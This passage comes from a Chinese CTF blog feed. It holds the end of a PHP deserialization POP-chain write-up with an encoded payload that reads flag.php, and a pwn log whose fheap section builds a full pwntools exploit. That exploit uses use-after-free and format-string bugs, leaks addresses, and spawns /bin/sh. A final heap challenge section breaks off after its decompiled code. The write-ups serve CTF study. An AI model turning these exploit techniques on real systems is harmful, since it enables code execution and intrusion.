class="title">read</span><span class="params">()</span>      </span></span><br><span class="line"><span class="function">    </span>&#123;   </span><br><span class="line">        <span class="keyword">$this</span>-&gt;nice = unserialize(<span class="keyword">$this</span>-&gt;amzing);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nice-&gt;aaa = $sth;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> baby();</span><br><span class="line">$a-&gt;bbb =&amp;$a-&gt;aaa; </span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure></div>

<p>生成可利用payload：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ANGELSCRIPT"><figure class="iseeu highlight /angelscript"><table><tr><td class="code"><pre><span class="line">O%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>baby%<span class="number">22</span>%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A9%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>skyobj%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>cool%<span class="number">22</span>%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22f</span>ilename%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22.</span>%<span class="number">2</span>Fflag.php%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>nice%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>amzing%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A245%<span class="number">3</span>A%<span class="number">22</span>O%<span class="number">253</span>A4%<span class="number">253</span>A%<span class="number">2522</span>baby%<span class="number">2522</span>%<span class="number">253</span>A3%<span class="number">253</span>A%<span class="number">257</span>Bs%<span class="number">253</span>A9%<span class="number">253</span>A%<span class="number">2522</span>%<span class="number">2500</span>%<span class="number">252</span>A%<span class="number">2500</span>skyobj%<span class="number">2522</span>%<span class="number">253</span>BO%<span class="number">253</span>A4%<span class="number">253</span>A%<span class="number">2522</span>cool%<span class="number">2522</span>%<span class="number">253</span>A3%<span class="number">253</span>A%<span class="number">257</span>Bs%<span class="number">253</span>A8%<span class="number">253</span>A%<span class="number">2522f</span>ilename%<span class="number">2522</span>%<span class="number">253</span>Bs%<span class="number">253</span>A8%<span class="number">253</span>A%<span class="number">2522f</span>lag.php%<span class="number">2522</span>%<span class="number">253</span>Bs%<span class="number">253</span>A4%<span class="number">253</span>A%<span class="number">2522</span>nice%<span class="number">2522</span>%<span class="number">253</span>BN%<span class="number">253</span>Bs%<span class="number">253</span>A6%<span class="number">253</span>A%<span class="number">2522</span>amzing%<span class="number">2522</span>%<span class="number">253</span>BN%<span class="number">253</span>B%<span class="number">257</span>Ds%<span class="number">253</span>A3%<span class="number">253</span>A%<span class="number">2522</span>aaa%<span class="number">2522</span>%<span class="number">253</span>BN%<span class="number">253</span>Bs%<span class="number">253</span>A3%<span class="number">253</span>A%<span class="number">2522</span>bbb%<span class="number">2522</span>%<span class="number">253</span>BN%<span class="number">253</span>B%<span class="number">257</span>D%<span class="number">0</span>A%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>Ds%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span>aaa%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span>bbb%<span class="number">22</span>%<span class="number">3</span>BR%<span class="number">3</span>A6%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure></div>



<p>那么这里已经对POP链有了一个简单理解，面向对象编程从一定程度上来说，就是完成类与类之间的调用。就像ROP一样，POP链起于一些小的“组件”，这些小“组件”可以调用其他的“组件”。在PHP中，“组件”就是这些魔术方法（<strong>wakeup()或</strong>destruct）。</p>
<p>就比如我们在利用的过程中，希望出现的一些对我们来说有用的POP链方法：</p>
<p>命令执行：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STYLUS"><figure class="iseeu highlight /stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">exec</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">passthru</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">popen</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">system</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure></div>

<p>文件操作：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STYLUS"><figure class="iseeu highlight /stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">file_put_contents</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">file_get_contents</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">unlink</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure></div>]]></content>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>PWN刷题记录</title>
    <url>/2020/05/27/PWN%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p>记录做过的题，没有难易区分，持续更新。。</p>
<a id="more"></a>

<h2 id="wustctf2020-babyfmt"><a href="#wustctf2020-babyfmt" class="headerlink" title="wustctf2020_babyfmt"></a>wustctf2020_babyfmt</h2><h2 id="2016HCTF-fheap"><a href="#2016HCTF-fheap" class="headerlink" title="2016HCTF-fheap"></a>2016HCTF-fheap</h2><h4 id="分析二进制文件"><a href="#分析二进制文件" class="headerlink" title="分析二进制文件"></a>分析二进制文件</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MAKEFILE"><figure class="iseeu highlight /makefile"><table><tr><td class="code"><pre><span class="line"><span class="section">adef@ubuntu:~/2016HCTF-fheap$ checksec pwn-f</span></span><br><span class="line">[*] '/home/adef/2016HCTF-fheap/pwn-f'</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure></div>

<p>除了RELRO保护外其他全开，运行程序发现是菜单形式的，可以进行create和delete，猜测是堆利用。</p>
<p><img src="/images/PWN/fheap/image-20200619142127412.png" alt="image-20200619142127412"></p>
<h4 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h4><p>在delete操作中，结束后并未对指针置NULL，存在UAF漏洞</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-114h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+10h] [rbp-110h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+118h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Pls give me the string id you want to delete\nid:"</span>);</span><br><span class="line">  v1 = sub_B65();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt; <span class="number">16</span> )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Invalid id"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( *((_QWORD *)&amp;unk_2020C0 + <span class="number">2</span> * v1 + <span class="number">1</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Are you sure?:"</span>);</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>uLL);</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(&amp;buf, <span class="string">"yes"</span>, <span class="number">3u</span>LL) )</span><br><span class="line">    &#123;</span><br><span class="line">      (*(<span class="keyword">void</span> (__fastcall **)(_QWORD, <span class="keyword">const</span> <span class="keyword">char</span> *))(*((_QWORD *)&amp;unk_2020C0 + <span class="number">2</span> * v1 + <span class="number">1</span>) + <span class="number">24L</span>L))(</span><br><span class="line">        *((_QWORD *)&amp;unk_2020C0 + <span class="number">2</span> * v1 + <span class="number">1</span>),  <span class="comment">// 并未将该指针释放</span></span><br><span class="line">        <span class="string">"yes"</span>);</span><br><span class="line">      *((_DWORD *)&amp;unk_2020C0 + <span class="number">4</span> * v1) = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>并且delete操作是通过结构体内部函数进行的，那么我们可以猜测结构体结构是data(0x18)+free_func。我们也就可以利用UAF漏洞进行覆盖。</p>
<p>create函数，对长度进行了限制：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">create</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+4h] [rbp-102Ch]</span></span><br><span class="line">  <span class="keyword">char</span> *ptr; <span class="comment">// [rsp+8h] [rbp-1028h]</span></span><br><span class="line">  <span class="keyword">char</span> *dest; <span class="comment">// [rsp+10h] [rbp-1020h]</span></span><br><span class="line">  <span class="keyword">size_t</span> nbytes; <span class="comment">// [rsp+18h] [rbp-1018h]</span></span><br><span class="line">  <span class="keyword">size_t</span> nbytesa; <span class="comment">// [rsp+18h] [rbp-1018h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+20h] [rbp-1010h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// [rsp+1028h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  ptr = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Pls give string size:"</span>);</span><br><span class="line">  nbytes = sub_B65();</span><br><span class="line">  <span class="keyword">if</span> ( nbytes &lt;= <span class="number">0x1000</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"str:"</span>);</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, nbytes) == <span class="number">-1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"got elf!!"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    nbytesa = <span class="built_in">strlen</span>(&amp;buf);</span><br><span class="line">    <span class="keyword">if</span> ( nbytesa &gt; <span class="number">0xF</span> )                 <span class="comment">//限制了长度大小</span></span><br><span class="line">    &#123;</span><br><span class="line">      dest = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(nbytesa);</span><br><span class="line">      <span class="keyword">if</span> ( !dest )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"malloc faild!"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">strncpy</span>(dest, &amp;buf, nbytesa);</span><br><span class="line">      *(_QWORD *)ptr = dest;</span><br><span class="line">      *((_QWORD *)ptr + <span class="number">3</span>) = free1;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">strncpy</span>(ptr, &amp;buf, nbytesa);</span><br><span class="line">      *((_QWORD *)ptr + <span class="number">3</span>) = free2;</span><br><span class="line">    &#125;</span><br><span class="line">    *((_DWORD *)ptr + <span class="number">4</span>) = nbytesa;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !*((_DWORD *)&amp;unk_2020C0 + <span class="number">4</span> * i) )</span><br><span class="line">      &#123;</span><br><span class="line">        *((_DWORD *)&amp;unk_2020C0 + <span class="number">4</span> * i) = <span class="number">1</span>;</span><br><span class="line">        *((_QWORD *)&amp;unk_2020C0 + <span class="number">2</span> * i + <span class="number">1</span>) = ptr;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"The string id is %d\n"</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)i);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( i == <span class="number">16</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"The string list is full"</span>);</span><br><span class="line">      (*((<span class="keyword">void</span> (__fastcall **)(<span class="keyword">char</span> *))ptr + <span class="number">3</span>))(ptr);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Invalid size"</span>);</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>当申请的字符串长度大于0xF时，程序会再执行一次malloc，然后把新的malloc的数据存放到第一次malloc的data区。即这样：</p>
<ul>
<li>字符串块&lt;16, 在原来的堆块上存放输入的字符串</li>
</ul>
<blockquote>
<p>create(8,’aaa’)</p>
</blockquote>
<p><img src="/images/PWN/fheap/clipboard0.png" alt="img"></p>
<ul>
<li>字符串块&gt;=16, malloc一个输入的字符串大小size的空间， 将该空间地址存放在原来的堆块中</li>
</ul>
<blockquote>
<p>create(0x20,’a’*32)</p>
</blockquote>
<p><img src="/images/PWN/fheap/clipboard1.png" alt="img"></p>
<p>那么我们可以覆盖free_func来leak addr。</p>
<h4 id="Leak-addr"><a href="#Leak-addr" class="headerlink" title="Leak addr"></a>Leak addr</h4><p>利用UAF漏洞来leak addr。首先create两个相同的string（长度小于0xF）。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line">create(<span class="number">4</span>,<span class="string">'aa'</span>)  <span class="comment">#id: 0</span></span><br><span class="line">create(<span class="number">4</span>,<span class="string">'bb'</span>)  <span class="comment">#id: 1</span></span><br></pre></td></tr></table></figure></div>

<p>然后释放</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br></pre></td></tr></table></figure></div>

<p>接下来创建一个长度为0x20的string</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line">create(<span class="number">0x20</span>,data)</span><br></pre></td></tr></table></figure></div>

<p>由于我们这次申请的长度大于了0xF，因此程序实际上进行了两次malloc(0x20)，此时我们就可以对id为1的chunk内容进行操作，因为程序本身开启了PIE，因此我们这里可以使用低位覆盖free_func的指针。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line">data=<span class="string">'a'</span>*<span class="number">0x18</span>+<span class="string">'\x2d'</span>   <span class="comment">#0xd2d调用puts函数</span></span><br></pre></td></tr></table></figure></div>

<p>接下来我们就可以获取leak出的addr了：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">io.recvuntil(<span class="string">'b'</span>*<span class="number">0x8</span>)</span><br><span class="line">data=io.recvuntil(<span class="string">'1.'</span>)[:<span class="number">-2</span>]</span><br><span class="line"><span class="keyword">print</span> data</span><br><span class="line"><span class="keyword">if</span> len(data)&gt;<span class="number">8</span>:</span><br><span class="line">    data=data[:<span class="number">8</span>]</span><br><span class="line">data=u64(data.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0xA000000000000</span> </span><br><span class="line"><span class="comment">#这里减掉的数是为了防止有\x0a结尾，若无\x0a，则不减掉此数</span></span><br><span class="line"><span class="keyword">print</span> hex(data)</span><br><span class="line">proc_base=data<span class="number">-0xd2d</span></span><br><span class="line">print(<span class="string">"proc_base=&gt;"</span>+hex(proc_base))</span><br></pre></td></tr></table></figure></div>

<h4 id="Leak-system-addr"><a href="#Leak-system-addr" class="headerlink" title="Leak system_addr"></a>Leak system_addr</h4><p>程序本身还存在格式化字符串漏洞，之前我们已经泄露出了PIE，那么我们可以利用该漏洞劫持PIE到printf，调试过程中发现，我们所输入的’yes’正好位于printf的上方，那么我们可以利用：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">payload = <span class="string">'a%9$s'</span>.ljust(<span class="number">0x18</span>,<span class="string">'#'</span>) + p64(printf_addr)</span><br><span class="line">creat(<span class="number">0x20</span>,payload)</span><br></pre></td></tr></table></figure></div>

<p>从而劫持PIE到printf，并输入了’a%9$s’作为参数，之后我们可以利用<code>pwntools</code>模块的<code>DynELF</code>来找出<code>system</code>函数地址。</p>
<h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*-coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">'./fheap'</span>)</span><br><span class="line">io = process(<span class="string">"./fheap"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size,creat_str)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'3.quit'</span>)</span><br><span class="line">    io.send(<span class="string">'create string'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'size:'</span>)</span><br><span class="line">    io.sendline(str(size))   </span><br><span class="line">    io.recvuntil(<span class="string">'str:'</span>)</span><br><span class="line">    io.send(creat_str)   </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(str_id)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'3.quit'</span>)</span><br><span class="line">    io.send(<span class="string">'delete string'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'id:'</span>)</span><br><span class="line">    io.sendline(str(str_id))   </span><br><span class="line">    io.recvuntil(<span class="string">'sure?:'</span>)</span><br><span class="line">    io.send(<span class="string">"yes"</span>) </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_addr</span><span class="params">(addr)</span>:</span></span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    payload = <span class="string">'a%9$s'</span>.ljust(<span class="number">0x18</span>,<span class="string">'#'</span>) + p64(printf_addr)</span><br><span class="line">    creat(<span class="number">0x20</span>,payload)</span><br><span class="line">    io.recvuntil(<span class="string">'3.quit'</span>)</span><br><span class="line">    io.sendline(<span class="string">'delete string'</span>)   </span><br><span class="line">    io.recvuntil(<span class="string">'delete\nid:'</span>)</span><br><span class="line">    io.sendline(str(<span class="number">1</span>))</span><br><span class="line">    io.recvuntil(<span class="string">'sure?:'</span>)</span><br><span class="line">    io.send(<span class="string">"yes.1111"</span>+p64(addr)+<span class="string">"\n"</span>)  </span><br><span class="line">    io.recvuntil(<span class="string">'a'</span>)</span><br><span class="line">    data = io.recvuntil(<span class="string">'####'</span>)[:<span class="number">-4</span>]</span><br><span class="line">    <span class="keyword">if</span> len(data) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'\x00'</span></span><br><span class="line">    <span class="keyword">if</span> len(data) &lt;= <span class="number">8</span>:</span><br><span class="line">        <span class="keyword">print</span> hex(u64(data.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)))</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">create(<span class="number">4</span>,<span class="string">"aa"</span>)</span><br><span class="line">create(<span class="number">4</span>,<span class="string">"bb"</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">create(<span class="number">0x20</span>,<span class="string">'a'</span>*<span class="number">0x14</span>+<span class="string">'b'</span>*<span class="number">4</span>+<span class="string">'\x2d'</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">io.recvuntil(<span class="string">'bbbb'</span>)</span><br><span class="line">data=io.recvuntil(<span class="string">'1.'</span>)[:<span class="number">-2</span>]</span><br><span class="line"><span class="keyword">if</span> len(data)&gt;<span class="number">8</span>:</span><br><span class="line">    data=data[:<span class="number">8</span>]</span><br><span class="line">data=u64(data.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0xA000000000000</span></span><br><span class="line">proc_base=data<span class="number">-0xd2d</span></span><br><span class="line">log.success(<span class="string">"proc_base=&gt;"</span>+str(hex(proc_base)))</span><br><span class="line">printf_addr=proc_base+elf.plt[<span class="string">'printf'</span>]</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">create(<span class="number">0x20</span>,<span class="string">'a'</span>*<span class="number">0x14</span>+<span class="string">'b'</span>*<span class="number">4</span>+<span class="string">'\x2d'</span>)</span><br><span class="line">delete(<span class="number">1</span>)  </span><br><span class="line">d = DynELF(leak_addr, proc_base, elf=ELF(<span class="string">'./feap'</span>))</span><br><span class="line">system_addr = d.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'system_addr:'</span>+hex(system_addr)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">create(<span class="number">0x20</span>,<span class="string">'/bin/sh;'</span> + <span class="string">'#'</span> * (<span class="number">0x18</span> - len(<span class="string">'/bin/sh;'</span>)) + p64(system_addr))</span><br><span class="line">delete(<span class="number">1</span>)  </span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>

<p><a href="https://github.com/As1def/ctf-challenges/tree/master/pwn/heap/use_after_free/2016HCTF-fheap" target="_blank" rel="noopener">题目附件</a></p>
<p>参考链接：<a href="https://blog.csdn.net/qq_31481187/article/details/73612451" target="_blank" rel="noopener">UAF (Use After Free)漏洞分析及利用</a></p>
<h2 id="V-amp-N2020-公开赛-simpleHeap"><a href="#V-amp-N2020-公开赛-simpleHeap" class="headerlink" title="[V&amp;N2020 公开赛]simpleHeap"></a>[V&amp;N2020 公开赛]simpleHeap</h2><p>main函数</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 savedregs; <span class="comment">// [rsp+10h] [rbp+0h]</span></span><br><span class="line"></span><br><span class="line">  sub_A39();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Welcome to V&amp;N challange!"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"This's a simple heap for you."</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    read_str();</span><br><span class="line">    <span class="keyword">switch</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;savedregs )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">        add();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2u</span>:</span><br><span class="line">        edit();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3u</span>:</span><br><span class="line">        show();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4u</span>:</span><br><span class="line">        <span class="keyword">delete</span>();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5u</span>:</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Please input current choice."</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>edit函数</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"idx?"</span>);</span><br><span class="line">  v1 = read_str();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt; <span class="number">9</span> || !note_list[v1] )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"content:"</span>);</span><br><span class="line">  modify_C39((__int64)note_list[v1], dword_202060[v1]);<span class="comment">// 漏洞函数</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Done!"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>modify_c39</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="function">int64 __fastcall <span class="title">modify_C39</span><span class="params">(__int64 a1, <span class="keyword">int</span> <span class="built_in">size</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)i;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt; <span class="built_in">size</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">read</span>(<span class="number">0</span>, (<span class="keyword">void</span> *)(i + a1), <span class="number">1u</span>LL) )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)(i + a1) == <span class="number">10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      result = i + a1;</span><br><span class="line">      *(_BYTE *)result = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

